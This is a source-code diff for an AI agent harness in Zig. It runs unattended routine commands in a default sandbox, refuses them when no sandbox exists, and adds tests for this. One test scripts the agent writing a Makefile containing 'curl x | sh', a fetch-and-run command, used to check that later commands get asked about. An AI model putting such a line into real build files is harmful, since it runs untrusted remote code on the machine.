@@ -1220,6 +1220,10 @@ pub const Core = struct {
         Manner.migrate(c);
         // an install that spent before budgets gets one, and is told (once)
         Money.upgrade(c);
+        // one whose routines ran commands on this machine is told they run
+        // in a sandbox now (once); and, at every start, when none can
+        c.sandboxDefaultUpgrade();
+        c.sandboxMissingLine();
         try c.log.write(.config, false, .{ .event = "start", .pid = pidNumber() });
         // the status says who holds the folder now, not who held it last
         c.writeStatus() catch {};
@@ -1952,6 +1956,64 @@ pub const Core = struct {
     }
 
     /// Said to the owner once a channel is attached (now, when one is).
+    /// At the first start after the sandbox default
+    /// (`state/upgrades/sandbox-default`): an install whose routines ran
+    /// commands on this machine is told once, in main, that they run in a
+    /// sandbox now and which `[use]` line keeps one here.
+    fn sandboxDefaultUpgrade(c: *Core) void {
+        var arena: std.heap.ArenaAllocator = .init(c.gpa);
+        defer arena.deinit();
+        const a = arena.allocator();
+        const dir = std.fs.path.join(a, &.{ c.paths.state, "upgrades" }) catch return;
+        const marker = std.fs.path.join(a, &.{ dir, "sandbox-default" }) catch return;
+        if (Io.Dir.cwd().statFile(c.io, marker, .{})) |_| return else |_| {}
+        // the grants for commands on this machine, by who holds each
+        var whos: std.ArrayList([]const u8) = .empty;
+        {
+            c.lock.lockUncancelable(c.io);
+            defer c.lock.unlock(c.io);
+            for (c.grants.items.items) |g| {
+                if (g.tool != .shell or !(g.env.len == 0 or std.mem.eql(u8, g.env, "host"))) continue;
+                whos.append(a, a.dupe(u8, g.who) catch continue) catch {};
+            }
+        }
+        const line = environments_mod.upgradeLine(a, c.env_list, c.rule_list, whos.items) catch null;
+        if (line) |l| {
+            c.log.write(.config, false, .{ .event = "sandbox default upgrade", .unattended = c.env_list.unattended }) catch {};
+            c.sayAtStart(l);
+        }
+        Io.Dir.cwd().createDirPath(c.io, dir) catch return;
+        util.writeReplace(c.io, marker, if (line != null) "said\n" else "nothing to do\n") catch {};
+    }
+
+    /// Why the commands of runs nobody watches can't run here, with what
+    /// to do about it; null when they can: their environment is a sandbox
+    /// (`[default] unattended`) and none can be made on this machine. They
+    /// are refused then, never run on the host instead.
+    pub fn sandboxMissing(io: Io, a: std.mem.Allocator, list: environments_mod.Environments) !?[]const u8 {
+        const e = list.find(list.unattended) orelse return null;
+        if (e.kind != .sandbox) return null;
+        const why = (try sandbox.unavailable(io, a)) orelse return null;
+        return try std.fmt.allocPrint(a, "Commands that routines run (schedules, triggers, workflows) are refused on this machine: they run in {s}, a sandbox, and {s}. Fix that; or keep them on this machine with unattended = host under [default] in environments.ini, then /reload.", .{ e.name, sandboxWhy(why) });
+    }
+
+    /// "install bubblewrap … to use sandboxes" as the reason it is:
+    /// "none can be made here: install bubblewrap …".
+    fn sandboxWhy(why: []const u8) []const u8 {
+        return std.mem.trimEnd(u8, why, ".");
+    }
+
+    /// Said at every start where an install has routines and their
+    /// sandbox can't be made (`harness doctor` says the same).
+    fn sandboxMissingLine(c: *Core) void {
+        if (c.tasks.len == 0 and c.trig_list.len == 0 and c.wf_list.items.len == 0) return;
+        var arena: std.heap.ArenaAllocator = .init(c.gpa);
+        defer arena.deinit();
+        const line = (sandboxMissing(c.io, arena.allocator(), c.env_list) catch return) orelse return;
+        c.log.write(.config, false, .{ .event = "no sandbox for unattended runs", .unattended = c.env_list.unattended }) catch {};
+        c.sayAtStart(line);
+    }
+
     fn sayAtStart(c: *Core, text: []const u8) void {
         if (c.chan != null) return c.say(text);
         const pa = c.paths_arena.allocator();
@@ -13121,7 +13183,7 @@ pub const Core = struct {
         const missing = try sandbox.unavailable(c.io, a);
         for (c.env_list.envs) |e| switch (e.kind) {
             .sandbox => {
-                try out.print(a, "{s}: sandbox, workspace {s}, network {s}", .{ e.name, @tagName(e.workspace), if (e.network) "on" else "off" });
+                try out.print(a, "{s}: sandbox{s}, workspace {s}, network {s}", .{ e.name, if (e.built_in) " (built in)" else "", @tagName(e.workspace), if (e.network) "on" else "off" });
                 for (e.read, 0..) |r, i| try out.print(a, "{s}{s}", .{ if (i == 0) ", reads " else ", ", r });
                 try out.print(a, "; {s}\n", .{missing orelse "ready"});
             },
@@ -13131,7 +13193,7 @@ pub const Core = struct {
                 try out.print(a, "{s}: remote {s}, port {d}{s}{s}; {s}\n", .{ e.name, e.host, e.port, if (e.dir.len > 0) ", starts in " else "", e.dir, why orelse "ready" });
             },
         };
-        try out.print(a, "Default: {s}.", .{c.env_list.default});
+        try out.print(a, "Default: {s}; for runs nobody watches (schedules, triggers, workflows): {s}.", .{ c.env_list.default, c.env_list.unattended });
         for (c.env_list.pins, 0..) |p, i| try out.print(a, "{s}{s} runs in {s}", .{ if (i == 0) " Pinned: " else ", ", p.who, p.env });
         if (c.env_list.pins.len > 0) try out.append(a, '.');
         return out.items;
@@ -13260,6 +13322,9 @@ pub const Core = struct {
         if (!rules.envName(name)) return .{ .why = "an environment's name is a-z, 0-9, - and _, up to 32" };
         for ([_][]const u8{ "host", "default", "use" }) |n| if (std.mem.eql(u8, name, n))
             return .{ .why = try std.fmt.allocPrint(a, "{s} is not the agent's to save: host is built in, and the default and the pins are the owner's", .{n}) };
+        // what runs nobody watches run in: the owner's own to change
+        if (std.mem.eql(u8, name, environments_mod.sandbox_name))
+            return .{ .why = "sandbox is what routines run in when nobody watches: its section is the owner's to write; save an environment of another name" };
         var body: std.ArrayList(u8) = .empty;
         var lines = std.mem.splitScalar(u8, text, '\n');
         while (lines.next()) |raw| {
@@ -13273,7 +13338,8 @@ pub const Core = struct {
             error.OutOfMemory => return e,
             else => return .{ .why = environments_mod.reason(e) orelse @errorName(e) },
         };
-        if (one.envs.len != 1) return .{ .why = "the section has no kind" };
+        if (one.own() != 1) return .{ .why = "the section has no kind" };
+        const mine = one.find(name) orelse return .{ .why = "the section has no kind" };
         // the whole file with it must read too
         const old_file = Io.Dir.cwd().readFileAlloc(c.io, c.paths.environments, a, .limited(1 << 20)) catch "";
         const swapped = try environments_mod.swapSection(a, old_file, name, section);
@@ -13282,8 +13348,8 @@ pub const Core = struct {
             else => return .{ .why = try std.fmt.allocPrint(a, "environments.ini would not read with it: {s}", .{environments_mod.reason(e) orelse @errorName(e)}) },
         };
         var reading: std.ArrayList(u8) = .empty;
-        try reading.print(a, "{s}: {s}", .{ name, try environments_mod.describe(a, one.envs[0]) });
-        for (one.envs[0].read, 0..) |r, i| try reading.print(a, "{s}{s}", .{ if (i == 0) "; reads " else ", ", r });
+        try reading.print(a, "{s}: {s}", .{ name, try environments_mod.describe(a, mine.*) });
+        for (mine.read, 0..) |r, i| try reading.print(a, "{s}{s}", .{ if (i == 0) "; reads " else ", ", r });
         if (swapped.old.len > 0) try reading.print(a, ". It replaces:\n{s}", .{swapped.old});
         return .{ .name = name, .reading = reading.items, .section = section, .replaces = swapped.old.len > 0 };
     }
@@ -13441,7 +13507,7 @@ pub const Core = struct {
         try c.log.write(.config, false, .{ .event = "env removed", .name = name, .snapshots = dropped });
         const plural = if (dropped == 1) "" else "s";
         const access = if (is_remote) "" else if (builtin.os.tag == .windows) " and its AppContainer with its access" else "";
-        const still = if (c.env_list.find(name) != null) " It is still in environments.ini: take its section out, then /reload." else "";
+        const still = if (c.env_list.find(name)) |e| (if (e.built_in) " It is built in: its home is made again when a command next runs there." else " It is still in environments.ini: take its section out, then /reload.") else "";
         if (is_remote) return std.fmt.allocPrint(a, "Removed {s}: its key and its kept host key (take the key's line out of the remote's authorized_keys too).{s}", .{ name, still });
         return std.fmt.allocPrint(a, "Removed {s}: its home, {d} snapshot{s}{s}.{s}", .{ name, dropped, plural, access, still });
     }
@@ -17504,10 +17570,27 @@ const Fix = struct {
         try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = p.config, .data = cfg });
         try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = p.briefs, .data = briefs_text });
         try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = p.tasks, .data = tasks_text });
+        // a machine that can't make a sandbox (Linux without bubblewrap):
+        // the tests' routines run their commands on the host there, as
+        // before the sandbox default (the tests of the default skip)
+        if (try sandbox.unavailable(t.io, a) != null) try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = p.environments, .data = "[default]\nunattended = host\n" });
         f.rec = .{};
         f.core = try Core.open(t.allocator, t.io, f.home, .{ .omnigate = "og-key-for-tests", .search = "search-key-123" });
         f.core.attach(f.rec.channel());
         try f.core.setOwner(42);
+        if (builtin.os.tag == .windows) {
+            // what a Windows sandbox needs to start cmd
+            const sys = try @import("proc.zig").systemDir(a);
+            f.core.path_var = try std.fmt.allocPrint(a, "{s};{s}", .{ sys, std.fs.path.dirname(sys).? });
+            f.core.system_vars = try @import("cdp.zig").testSystemVars(a);
+        }
+    }
+
+    /// Routines' commands on this machine, as `[default] unattended =
+    /// host` puts them: for tests of what holds on the host.
+    fn routinesOnHost(f: *Fix) !void {
+        try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = f.core.paths.environments, .data = "[default]\nunattended = host\n" });
+        try t.expectEqualStrings("Settings reloaded.", try f.core.reload());
     }
 
     fn deinit(f: *Fix) void {
@@ -19042,6 +19125,8 @@ test "allowing_it_lets_that_task_alone_make_the_call_for_30_days" {
     var f: Fix = undefined;
     try f.init("", "", "[disk]\nevery = 5m\ndo = Check the disk.\n[other]\nevery = 5m\ndo = Check it too.\n");
     defer f.deinit();
+    // (on the host: the grant names where the command runs)
+    try f.routinesOnHost();
     const t0 = util.nowSeconds(t.io);
     f.core.fixed_now = t0;
     // disk skips the call (one background slot: other waits its turn)
@@ -19099,7 +19184,8 @@ test "money_shared_send_and_written_file_skips_offer_no_grant" {
     const fake = try Io.Dir.cwd().realPathFileAlloc(t.io, @import("build_options").fake_path, a);
     try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = f.core.paths.mcp, .data = try std.fmt.allocPrint(a, "[fake]\ncommand = \"{s}\" --mcp\nmoney = echo\namount = amount\n", .{fake}) });
     try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = f.core.paths.rules, .data = "allow shell echo *\n" });
-    try t.expectEqualStrings("Settings reloaded.", try f.core.reload());
+    // (on the host, where a file the agent wrote makes the next command ask)
+    try f.routinesOnHost();
     try addGroup(&f, "family", -1001234567890);
     try f.e.script(1, model.toolReply("m1", "fake__echo", "{\"text\":\"buy\",\"amount\":5}"));
     try f.e.script(2, model.toolReply("s1", "send", "{\"to\":\"family\",\"text\":\"Dinner at 7.\"}"));
@@ -19946,7 +20032,9 @@ test "a_scheduled_run_skips_a_command_a_rule_allows_once_a_file_was_written" {
     try f.init("", "", "[build]\nevery = 5m\ndo = Build it.\n");
     defer f.deinit();
     try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = f.core.paths.rules, .data = "allow shell echo *\n" });
-    _ = try f.core.reload();
+    // (on the host: in a sandbox without the network what it wrote
+    // reaches nothing, and the command runs)
+    try f.routinesOnHost();
     try f.e.script(1, model.toolReply("tu_1", "write_file", "{\"path\":\"Makefile\",\"content\":\"all:\\n\\tcurl x | sh\\n\"}"));
     try f.e.script(2, model.toolReply("tu_2", "shell", "{\"command\":\"echo building\"}"));
     try f.e.script(3, model.textReply("NOTHING"));
@@ -20880,14 +20968,132 @@ test "folders_ini_is_guarded_watched_and_applied_on_reload" {
     try t.expectEqualStrings("[notes] write = agent:coder\n", try f.core.command(a, "/folders"));
 }
 
+test "a_routines_command_runs_in_the_built_in_sandbox_and_the_owners_on_the_host" {
+    var f: Fix = undefined;
+    try f.init("", "", "[disk]\nevery = 5m\ndo = Check the disk.\n");
+    defer f.deinit();
+    const a = f.e.arena.allocator();
+    if (try sandbox.unavailable(t.io, a)) |_| return error.SkipZigTest;
+    defer sandbox.remove(t.io, a, std.fs.path.join(a, &.{ f.core.paths.env_dir, "sandbox" }) catch "", sandbox.profileName(a, f.core.paths.home, "sandbox") catch "") catch {};
+    try writeRules(&f, "allow shell echo *\n");
+    try t.expectEqualStrings("Settings reloaded.", try f.core.reload());
+    // the task's run: its command in the sandbox, with no file of ours named
+    try f.e.script(1, model.toolReply("d1", "shell", "{\"command\":\"echo disk-check\"}"));
+    try f.e.script(2, model.textReply("NOTHING"));
+    f.core.tick();
+    try waitFile(&f.e, "requests/002.json");
+    waitIdle(f.core);
+    const req2 = try f.e.request(2);
+    try t.expect(std.mem.indexOf(u8, req2, "disk-check") != null);
+    try t.expect(std.mem.indexOf(u8, req2, "exit code 0") != null);
+    // its shell tool said where, and offered no host
+    const req1 = try f.e.request(1);
+    try t.expect(std.mem.indexOf(u8, req1, "Commands run in sandbox (sandbox; workspace rw, no network), and nowhere else.") != null);
+    try t.expect(std.mem.indexOf(u8, req1, "host (this machine)") == null);
+    const lt = try logText(&f);
+    try t.expect(std.mem.indexOf(u8, lt, "\"tool\":\"shell\",\"decision\":\"allow\"") != null);
+    try t.expect(std.mem.indexOf(u8, lt, "\"arg\":\"echo disk-check\",\"env\":\"sandbox\"") != null);
+    // the owner's own run: the host, as before, and the sandbox to name
+    try f.e.script(3, model.toolReply("c1", "shell", "{\"command\":\"echo owner-check\"}"));
+    try f.e.script(4, model.textReply("done"));
+    try f.core.startWorker();
+    try f.core.handleText("check it");
+    try f.rec.waitFor("done");
+    const req3 = try f.e.request(3);
+    try t.expect(std.mem.indexOf(u8, req3, "Commands run in host (this machine). `env` names another: sandbox (sandbox; workspace rw, no network).") != null);
+    const lt2 = try logText(&f);
+    try t.expect(std.mem.indexOf(u8, lt2, "\"arg\":\"echo owner-check\",\"env\"") == null);
+}
+
+test "without_a_sandbox_a_routines_command_is_refused_kept_and_said_at_start" {
+    var f: Fix = undefined;
+    try f.init("", "", "[disk]\nevery = 5m\ndo = Check the disk.\n");
+    defer f.deinit();
+    const a = f.e.arena.allocator();
+    // (the fixture puts routines on the host where no sandbox can be made:
+    // here they go by the default again, with none to be had)
+    try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = f.core.paths.environments, .data = "" });
+    try writeRules(&f, "allow shell echo *\n");
+    try t.expectEqualStrings("Settings reloaded.", try f.core.reload());
+    sandbox.unavailable_override = "install bubblewrap (the bwrap command) to use sandboxes";
+    defer sandbox.unavailable_override = null;
+    try f.e.script(1, model.toolReply("d1", "shell", "{\"command\":\"echo must-not-run > ran.txt\"}"));
+    try f.e.script(2, model.textReply("NOTHING"));
+    f.core.tick();
+    try f.rec.waitFor("BUTTONS Skipped [1]: task disk could not make this call without you:\nshell: echo must-not-run > ran.txt\nRefused: sandbox can't run commands here: install bubblewrap (the bwrap command) to use sandboxes. Nobody watches this run, so it isn't run on this machine instead ([default] unattended = host in environments.ini would).");
+    waitIdle(f.core);
+    // never the host instead
+    try t.expectError(error.FileNotFound, Io.Dir.cwd().statFile(t.io, try std.fs.path.join(a, &.{ f.core.workspace, "ran.txt" }), .{}));
+    // no grant lifts it: environments.ini does
+    const b = f.rec.buttonsWith("Skipped [1]").?;
+    try t.expect(b.get("allow") == null);
+    try t.expect(b.get("dismiss") != null);
+    const lt = try logText(&f);
+    try t.expect(std.mem.indexOf(u8, lt, "\"decision\":\"deny\",\"why\":\"sandbox can't run commands here") != null);
+    // the line at start, for an install with routines; /envs says it too
+    f.core.sandboxMissingLine();
+    try f.rec.waitFor("Commands that routines run (schedules, triggers, workflows) are refused on this machine: they run in sandbox, a sandbox, and install bubblewrap (the bwrap command) to use sandboxes. Fix that; or keep them on this machine with unattended = host under [default] in environments.ini, then /reload.");
+    try t.expect(std.mem.indexOf(u8, try f.core.command(a, "/envs"), "sandbox: sandbox (built in), workspace rw, network off; install bubblewrap") != null);
+    // unattended = host: nothing to say, and the command runs here
+    try f.routinesOnHost();
+    try t.expectEqual(null, try Core.sandboxMissing(t.io, a, f.core.env_list));
+}
+
+test "the_sandbox_default_is_said_once_to_an_install_whose_routines_ran_commands_here" {
+    var f: Fix = undefined;
+    try f.init("", "", "");
+    defer f.deinit();
+    const a = f.e.arena.allocator();
+    const marker = try std.fs.path.join(a, &.{ f.core.paths.state, "upgrades", "sandbox-default" });
+    // a new install: nothing to say, and the marker is there from its start
+    try t.expectEqualStrings("nothing to do\n", try Io.Dir.cwd().readFileAlloc(t.io, marker, a, .unlimited));
+    try t.expectEqual(0, f.rec.count("Commands that routines run now run in a sandbox"));
+    // an install from before, whose rules let a schedule run commands
+    try Io.Dir.cwd().deleteFile(t.io, marker);
+    try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = f.core.paths.environments, .data = "[sandbox]\nkind = sandbox\nnetwork = on\n" });
+    try writeRules(&f, "[schedule:backup]\nallow shell rsync *\n");
+    try t.expectEqualStrings("Settings reloaded.", try f.core.reload());
+    f.core.sandboxDefaultUpgrade();
+    try f.rec.waitFor("Commands that routines run now run in a sandbox: no network, no home folder. To keep one on this machine, add its line under [use] in environments.ini and send /reload: schedule:backup = host. (unattended = host under [default] keeps them all there.) Your [sandbox] section is now what routines run in.");
+    try t.expectEqualStrings("said\n", try Io.Dir.cwd().readFileAlloc(t.io, marker, a, .unlimited));
+    try t.expect(std.mem.indexOf(u8, try logText(&f), "\"event\":\"sandbox default upgrade\"") != null);
+    // once: the marker holds it back
+    f.core.sandboxDefaultUpgrade();
+    // /env rm on the built-in one takes its home away, and says it stays
+    try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = f.core.paths.environments, .data = "" });
+    try t.expectEqualStrings("Settings reloaded.", try f.core.reload());
+    try t.expect(std.mem.endsWith(u8, try f.core.command(a, "/env rm sandbox"), " It is built in: its home is made again when a command next runs there."));
+    try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = f.core.paths.environments, .data = "[sandbox]\nkind = sandbox\nnetwork = on\n" });
+    try t.expectEqualStrings("Settings reloaded.", try f.core.reload());
+    try t.expectEqual(1, f.rec.count("Commands that routines run now run in a sandbox"));
+    // a [sandbox] that is no sandbox: the file is refused, with why
+    try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = f.core.paths.environments, .data = "[sandbox]\nkind = remote\nhost = a@192.0.2.1\n" });
+    const bad = try f.core.reload();
+    try t.expect(std.mem.indexOf(u8, bad, "environments.ini line 2 has an error: kind = remote ([sandbox] is what routines run in when nobody watches: it must be kind = sandbox") != null);
+    // a grant for the host that a trigger's runs hold says it too
+    try Io.Dir.cwd().deleteFile(t.io, marker);
+    try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = f.core.paths.environments, .data = "" });
+    try writeRules(&f, "");
+    try t.expectEqualStrings("Settings reloaded.", try f.core.reload());
+    {
+        f.core.lock.lockUncancelable(t.io);
+        defer f.core.lock.unlock(t.io);
+        try f.core.grants.addFor(.shell, "host", "echo x", "trigger:mail", f.core.now() + 3600);
+    }
+    f.core.sandboxDefaultUpgrade();
+    try f.rec.waitFor("send /reload: trigger:mail = host. (unattended = host under [default] keeps them all there.)");
+}
+
 test "environments_ini_is_guarded_watched_and_applied_on_reload" {
     var f: Fix = undefined;
     try f.init("", "", "");
     defer f.deinit();
     const a = f.e.arena.allocator();
-    // init wrote one with comments only: host alone
-    try t.expect(std.mem.indexOf(u8, try Io.Dir.cwd().readFileAlloc(t.io, f.core.paths.environments, a, .unlimited), "; [box]") != null);
-    try t.expectEqualStrings("host: the workspace on this machine (built in)\nDefault: host.", try f.core.command(a, "/envs"));
+    // init wrote one with comments only: the host and the built-in sandbox
+    if (try sandbox.unavailable(t.io, a) == null) {
+        try t.expect(std.mem.indexOf(u8, try Io.Dir.cwd().readFileAlloc(t.io, f.core.paths.environments, a, .unlimited), "; [box]") != null);
+        try t.expectEqualStrings("host: the workspace on this machine (built in)\nsandbox: sandbox (built in), workspace rw, network off; ready\nDefault: host; for runs nobody watches (schedules, triggers, workflows): sandbox.", try f.core.command(a, "/envs"));
+    }
     try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = f.core.paths.environments, .data = "[box]\nkind = sandbox\nworkspace = ro\n[use]\nschedule = box\n" });
     // a change is noticed, and applies on /reload
     f.core.last_status_s = 0;
@@ -21712,6 +21918,7 @@ test "a_definitions_task_keeps_it_on_its_skipped_item_and_the_grant_is_the_tasks
     defer f.deinit();
     const a = f.e.arena.allocator();
     try addDefinition(&f, "scout", scout_md);
+    try f.routinesOnHost();
     try t.expectEqualStrings("Settings reloaded.", try setTasks(&f, "[watch]\nevery = 5m\nagent = scout\ndo = Look.\n"));
     const t0 = util.nowSeconds(t.io);
     f.core.fixed_now = t0;
@@ -23150,6 +23357,8 @@ test "a_shell_step_after_files_were_written_is_asked_naming_them" {
     defer f.deinit();
     const a = f.e.arena.allocator();
     try writeRules(&f, "allow shell echo *\n");
+    // (on the host, where a file the agent wrote makes the next command ask)
+    try f.routinesOnHost();
     try setWorkflow(&f, "build", "workflow build\nstep write\ntool write_file {\"path\": \"Makefile\", \"content\": \"all:\"}\nstep run\ntool shell {\"command\": \"echo built\"}\nstep tell\nsay {run}\n");
     _ = try f.core.command(a, "/workflow start build");
     runWorkflows(&f);
@@ -24429,6 +24638,8 @@ test "env_save_writes_the_section_and_applies_it_at_once" {
     try t.expect(std.mem.indexOf(u8, (try f.core.checkEnv(a, "host", "kind = sandbox")).why.?, "host is not the agent's to save") != null);
     try t.expect((try f.core.checkEnv(a, "default", "env = box")).why != null);
     try t.expect((try f.core.checkEnv(a, "use", "owner = box")).why != null);
+    // nor what routines run in
+    try t.expect(std.mem.indexOf(u8, (try f.core.checkEnv(a, "sandbox", "kind = sandbox\nnetwork = on")).why.?, "sandbox is what routines run in") != null);
     try t.expect((try f.core.checkEnv(a, "Box", "kind = sandbox")).why != null);
     try t.expect((try f.core.checkEnv(a, "new", "kind = host")).why != null);
     try t.expect((try f.core.checkEnv(a, "new", "kind = sandbox\n[use]\nowner = new")).why != null);
